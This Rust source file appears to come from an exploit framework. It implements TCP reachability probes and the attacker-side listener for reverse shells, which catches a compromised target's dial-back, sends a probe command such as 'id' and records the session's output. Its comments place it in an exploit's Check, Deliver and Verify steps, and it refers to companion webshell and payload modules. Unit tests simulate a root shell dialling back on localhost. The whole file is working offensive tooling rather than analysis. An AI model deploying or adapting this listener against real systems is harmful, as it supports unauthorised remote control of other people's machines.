//! The net widget: TCP connectivity probes and the reverse-shell listener
//! (the ATTACKER side of the RevShell delivery form). Scripts declare a
//! local listen port in the Check step, the target's dial-back one-liner
//! lands in the Deliver step, and this listener catches the session in
//! the Verify step — first-line capture with a wall-clock deadline,
//! because a listener that never exits is a hung exploit.

use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream, ToSocketAddrs};
use std::time::{Duration, Instant};

use serde_json::{json, Value};

use crate::error::Atom;

/// Resolve and connect with a timeout. Returns the peer's resolved
/// socket address string for the trace.
pub fn connect(host: &str, port: u16, timeout: Duration) -> Result<TcpStream, Atom> {
    let address = format!("{host}:{port}");
    let mut candidates = address.to_socket_addrs().map_err(|error| {
        Atom::net_unreachable("E_NET_001", format!("resolve {address}: {error}"))
    })?;
    let socket = candidates
        .next()
        .ok_or_else(|| Atom::net_unreachable("E_NET_001", format!("no address for {address}")))?;
    TcpStream::connect_timeout(&socket, timeout)
        .map_err(|error| Atom::net_unreachable("E_NET_001", format!("connect {socket}: {error}")))
}

/// Reachability probe without holding the stream: true when a TCP
/// connection can be established inside the timeout. The port-assert
/// basis of a target-alive Check step.
pub fn is_reachable(host: &str, port: u16, timeout: Duration) -> bool {
    connect(host, port, timeout).is_ok()
}

/// One caught session: the banner fragment plus metadata. Interactive
/// shell driving is the operator's business — the exploit's Verify step
/// only needs proof of the session.
#[derive(Debug, Clone)]
pub struct CaughtSession {
    pub peer: String,
    pub local_port: u16,
    /// First bytes the target sent (banner / prompt), lossy UTF-8.
    pub first_bytes: Vec<u8>,
    pub waited_ms: u64,
}

impl CaughtSession {
    pub fn text(&self) -> String {
        String::from_utf8_lossy(&self.first_bytes).into_owned()
    }

    pub fn to_value(&self) -> Value {
        json!({
            "peer": self.peer,
            "local_port": self.local_port,
            "banner_b64": crate::payload::b64_encode(&self.first_bytes),
            "waited_ms": self.waited_ms,
        })
    }
}

/// Bind the listener for a reverse shell. The caller drops the listener
/// when the exploit exits; bind failure (port taken) is an auth-style
/// hard error, not a retry.
pub fn rev_shell_listener(port: u16) -> Result<TcpListener, Atom> {
    TcpListener::bind(("0.0.0.0", port))
        .map_err(|error| Atom::auth_denied("E_NET_002", format!("bind 0.0.0.0:{port}: {error}")))
}

/// Await the dial-back with a deadline. On accept: read the first
/// fragment (a short banner window), optionally send one probe command
/// (e.g. `id\n`) to elicit a response, then capture whatever arrives
/// inside the capture window. Returns None on deadline (the Machine's
/// Verify step turns that into Atom::timeout).
pub fn catch_session(
    listener: &TcpListener,
    deadline: Duration,
    probe_command: Option<&str>,
    capture_window: Duration,
) -> Result<Option<CaughtSession>, Atom> {
    listener
        .set_nonblocking(true)
        .map_err(|error| Atom::parse("E_NET_003", format!("listener nonblocking: {error}")))?;
    let start = Instant::now();
    loop {
        match listener.accept() {
            Ok((stream, peer)) => {
                let port = listener
                    .local_addr()
                    .map(|addr| addr.port())
                    .unwrap_or_default();
                let waited_ms = start.elapsed().as_millis() as u64;
                let first_bytes =
                    session_fragment(stream, probe_command, capture_window).unwrap_or_default();
                return Ok(Some(CaughtSession {
                    peer: peer.to_string(),
                    local_port: port,
                    first_bytes,
                    waited_ms,
                }));
            }
            Err(error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                if start.elapsed() >= deadline {
                    return Ok(None);
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(error) => {
                return Err(Atom::net_unreachable(
                    "E_NET_001",
                    format!("accept: {error}"),
                ));
            }
        }
    }
}

/// Read the first fragment of a session: optionally send a probe command,
/// then read whatever arrives within the window (non-blocking poll).
fn session_fragment(
    mut stream: TcpStream,
    probe_command: Option<&str>,
    window: Duration,
) -> std::io::Result<Vec<u8>> {
    stream.set_nonblocking(true)?;
    let mut stream_clone = stream.try_clone()?;
    if let Some(command) = probe_command {
        let mut probe = command.as_bytes().to_vec();
        probe.push(b'\n');
        // A listener that swallows the write (half-closed target) still
        // yields whatever the target already sent — ignore write failures.
        let _ = stream.write_all(&probe);
    }
    let start = Instant::now();
    let mut buffer = [0u8; 1024];
    let mut out = Vec::new();
    while start.elapsed() < window && out.len() < 8192 {
        match stream_clone.read(&mut buffer) {
            Ok(0) => break,
            Ok(n) => out.extend_from_slice(&buffer[..n]),
            Err(ref error) if error.kind() == std::io::ErrorKind::WouldBlock => {
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(_) => break,
        }
    }
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn connect_refused_is_net_unreachable() {
        let error = connect("127.0.0.1", 1, Duration::from_millis(300)).unwrap_err();
        assert_eq!(error.kind, "net_unreachable");
        assert!(!is_reachable("127.0.0.1", 1, Duration::from_millis(300)));
    }

    #[test]
    fn is_reachable_true_for_open_port() {
        let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
        let port = listener.local_addr().unwrap().port();
        assert!(is_reachable("127.0.0.1", port, Duration::from_millis(500)));
    }

    #[test]
    fn catch_session_captures_banner_and_probe_reply() {
        let listener = rev_shell_listener(0).unwrap();
        let port = listener.local_addr().unwrap().port();
        // The "target": dials back, sends a banner, answers the probe.
        let target = std::thread::spawn(move || {
            let mut stream = TcpStream::connect(("127.0.0.1", port)).unwrap();
            stream.write_all(b"Welcome to EvilOS\n").unwrap();
            std::thread::sleep(Duration::from_millis(100));
            let mut buffer = [0u8; 128];
            let _ = stream.read(&mut buffer);
            stream.write_all(b"uid=0(root)\n").unwrap();
            std::thread::sleep(Duration::from_millis(150));
        });
        let caught = catch_session(
            &listener,
            Duration::from_secs(5),
            Some("id"),
            Duration::from_millis(500),
        )
        .unwrap();
        target.join().unwrap();
        let session = caught.expect("session must be caught");
        assert!(session.peer.contains("127.0.0.1"));
        let text = session.text();
        assert!(
            text.contains("EvilOS") && text.contains("uid=0"),
            "banner + probe reply both captured: {text:?}"
        );
        assert!(session.waited_ms < 5_000);
    }

    #[test]
    fn catch_session_deadline_returns_none() {
        let listener = rev_shell_listener(0).unwrap();
        let caught = catch_session(
            &listener,
            Duration::from_millis(200),
            None,
            Duration::from_millis(100),
        )
        .unwrap();
        assert!(caught.is_none(), "no dial-back inside the deadline");
    }

    #[test]
    fn double_bind_is_auth_denied() {
        let _held = rev_shell_listener(0).unwrap();
        let port = _held.local_addr().unwrap().port();
        let error = rev_shell_listener(port).unwrap_err();
        assert_eq!(error.kind, "auth_denied");
    }

    #[test]
    fn caught_session_value_shape() {
        let session = CaughtSession {
            peer: "1.2.3.4:4444".into(),
            local_port: 4444,
            first_bytes: b"hello".to_vec(),
            waited_ms: 42,
        };
        let value = session.to_value();
        assert_eq!(value["peer"], json!("1.2.3.4:4444"));
        assert_eq!(value["waited_ms"], json!(42));
        assert_eq!(
            crate::webshell::b64_decode(value["banner_b64"].as_str().unwrap()).unwrap(),
            b"hello".to_vec()
        );
    }
}
